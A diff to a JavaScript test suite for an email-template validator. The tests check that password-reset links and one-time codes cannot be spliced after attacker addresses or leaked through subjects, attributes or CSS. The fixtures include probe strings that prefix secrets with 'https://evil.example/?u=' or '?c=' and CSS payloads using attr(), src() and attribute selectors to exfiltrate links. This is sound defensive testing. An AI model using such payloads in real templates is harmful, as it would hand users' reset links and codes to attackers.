@@ -256,36 +256,65 @@ test('a link placeholder cannot hand its one-time secret to another site', () =>
   assert.deepEqual(validateTemplate('password_reset', withHtml('<p><a href=" {{url}} ">again</a></p>'), layout), { ok: true });
 });
 
-test('in the text version a link placeholder cannot be joined into a longer address', () => {
+test('in the text version a secret is led only by the start, a space, a line break or "("', () => {
   const reset = englishTemplate('password_reset');
   const layout = SEEDS.layouts[0];
   const withText = (extra) => ({ ...reset, text: `${reset.text}${extra}` });
   const joined = /only a space, a line break or "\(" may come right before it/;
-  // The reviewer's probes: any ASCII sign, another letter, an invisible or
-  // no-break space, an empty condition, or another value right before it.
+  // The reviewers' probes: any ASCII sign, any other letter or punctuation
+  // (Android's Linkify reads CJK letters, an ideographic comma, a middle dot
+  // or a dash as part of an address), an invisible or unusual space, an empty
+  // condition, or another value right before it.
   const before = ['https://evil.example/?u=', '?u=', 'x', 'https://evil.example/x!', 'https://evil.example/x,', 'https://evil.example/x;',
     'https://evil.example/x*', 'https://evil.example/x$', "https://evil.example/x'", 'https://evil.example/?u=(', 'https://evil.example/?u=\u00e9',
-    'https://evil.example/?u=\u00a0', 'https://evil.example/?u=\u200b', 'https://evil.example/?u=&#61;', 'https://evil.example/?u={{#if url}}{{/if}}', 'Reset {{url}}'];
+    'https://evil.example/?u=\u00a0', 'https://evil.example/?u=\u200b', 'https://evil.example/?u=&#61;', 'https://evil.example/?u={{#if url}}{{/if}}', 'Reset {{url}}',
+    '\u3053\u3061\u3089', '\u8be6\u60c5\uff1a', 'x\u3001', 'x\u3002', 'x\u00b7', 'x\u2013', 'x\u2010', 'x\u00ab', 'x\u3000', 'x\v', 'x\u2028'];
   for (const lead of before) hasError(validateTemplate('password_reset', withText(`\n${lead}{{url}}`), layout), 'text', joined);
-  // Text mail fetches nothing, so what follows can only extend our own link;
-  // a space, a "(" after one, punctuation outside ASCII or a CJK letter before
-  // it are fine, as Japanese, Chinese and Korean translations write it.
-  for (const ok of ['\n\u3053\u3061\u3089{{url}}', '\n\u8be6\u60c5\uff1a{{url}}', '\n\uc5ec\uae30{{url}}', '\nAgain: {{url}}', '\n({{url}})', '\nOpen it: {{url}}.', '\n{{url}}x']) {
+  // Text mail fetches nothing, so what follows can only extend our own link.
+  for (const ok of ['\n\u3053\u3061\u3089 {{url}}', '\n\u8be6\u60c5\uff1a\n{{url}}', '\nAgain: {{url}}', '\n({{url}})', '\nx ({{url}})', '\nOpen it: {{url}}.', '\n{{url}}x', '\n\t{{url}}']) {
     assert.deepEqual(validateTemplate('password_reset', withText(ok), layout), { ok: true }, ok);
   }
   const invite = englishTemplate('project_invite');
   hasError(validateTemplate('project_invite', { ...invite, text: `${invite.text}\n{{inviter}}{{url}}` }, layout), 'text', joined);
   // The whole mail is checked, the layout's text around the template's.
   const splice = { html: layout.html, text: 'https://evil.example/?u={{content}}' };
-  hasError(validateTemplate('password_reset', { ...reset, text: '{{url}} to reset' }, splice), 'text', joined);
+  hasError(validateTemplate('password_reset', { ...reset, text: '{{url}} to reset' }, splice), 'text', /may come right before/);
 });
 
-test('a layout\'s text leads each part as a link may be led', () => {
+test('a layout\'s text leads each part as a secret may be led', () => {
   const layout = SEEDS.layouts[0];
-  for (const text of ['https://evil.example/?u={{content}}', 'https://evil.example/?u={{why}}\n{{content}}', '{{content}}\nx{{preheader}}']) {
+  for (const text of ['https://evil.example/?u={{content}}', 'https://evil.example/?u={{why}}\n{{content}}', '{{content}}\nx{{preheader}}', '\u3053\u3061\u3089{{content}}']) {
     hasError(validateLayout({ html: layout.html, text }, []), 'text', /only a space, a line break or "\(" may come right before/);
   }
   assert.deepEqual(validateLayout({ html: layout.html, text: 'Homeroom\n\n{{content}}\n\n{{why}}' }, []), { ok: true });
+});
+
+test('a code is a secret too: led like a link wherever it is text, and in no attribute', () => {
+  const layout = SEEDS.layouts[0];
+  const codes = ['otp', 'account_email', 'username_change', 'waitlist_joined', 'waitlist_code'];
+  for (const kind of codes) {
+    const t = englishTemplate(kind);
+    assert.deepEqual(validateTemplate(kind, t, layout), { ok: true }, `${kind} as seeded`);
+    const joined = /\{\{code\}\} is a one-time secret, so in the (HTML|text version) only a space/;
+    hasError(validateTemplate(kind, { ...t, html: `${t.html}<p>Sign in at https://evil.example/?c={{code}}</p>` }, layout), 'html', joined);
+    hasError(validateTemplate(kind, { ...t, text: `${t.text}\nSign in at https://evil.example/?c={{code}}` }, layout), 'text', joined);
+    hasError(validateTemplate(kind, { ...t, why: 'https://evil.example/?c={{code}}' }, layout), 'html', joined);
+    hasError(validateTemplate(kind, { ...t, preheader: 'https://evil.example/?c={{code}}' }, layout), 'html', joined);
+    hasError(validateTemplate(kind, { ...t, html: `${t.html}<p title="{{code}}">x</p>` }, layout), 'html', /cannot go in an attribute \(title\)/);
+  }
+  const otp = englishTemplate('otp');
+  // As an element's own text, or after a space, it is fine.
+  for (const html of ['<p style="font-size:28px">{{code}}</p>', '<p>Your code: {{code}}</p>', '<p>(<b>{{code}}</b>)</p>']) {
+    assert.deepEqual(validateTemplate('otp', { ...otp, html }, layout), { ok: true }, html);
+  }
+  hasError(validateTemplate('otp', { ...otp, subject: 'Code:{{code}}' }, layout), 'subject', /in the subject only a space/);
+  assert.deepEqual(validateTemplate('otp', { ...otp, subject: '{{code}} is your code' }, layout), { ok: true });
+});
+
+test('a link cannot go in the subject', () => {
+  const reset = englishTemplate('password_reset');
+  hasError(validateTemplate('password_reset', { ...reset, subject: 'https://evil.example/?u={{url}}' }, SEEDS.layouts[0]), 'subject', /cannot go in the subject/);
+  hasError(validateTemplate('password_reset', { ...reset, subject: 'Reset {{url}}' }, SEEDS.layouts[0]), 'subject', /cannot go in the subject/);
 });
 
 test('in HTML a link placeholder is a whole href, or the whole text of that link', () => {
@@ -314,4 +343,14 @@ test('probe: a <style> block cannot spell a link out with attribute selectors', 
   }
   const html = `<style>${css}</style><p><a href="{{url}}">Reset</a></p>${anchors}`;
   hasError(validateTemplate('password_reset', { subject: 'Reset', preheader: '', why: '', html, text: 'Reset: {{url}}' }, SEEDS.layouts[0]), 'html', /attribute selector/);
+});
+
+test('probe r3: CSS reads no attribute and a <style> block loads through no function', () => {
+  const reset = englishTemplate('password_reset');
+  const layout = SEEDS.layouts[0];
+  const html = (extra) => ({ ...reset, html: `${extra}<p><a href="{{url}}">R</a></p>` });
+  hasError(validateTemplate('password_reset', html('<style>a{background:image(attr(href))}</style>'), layout), 'html', /attr\(\)/);
+  hasError(validateTemplate('password_reset', html('<style>@font-face{font-family:x;src:src("https://evil.example/f")}</style>'), layout), 'html', /cannot load anything/);
+  hasError(validateTemplate('password_reset', html('<p style="background:image(attr(href))">x</p>'), layout), 'html', /attr\(\)/);
+  hasError(validateTemplate('password_reset', html('<!--[if mso]><style>a[href^="h"]{x:y}</style><![endif]-->'), layout), 'html', /attribute selector/);
 });
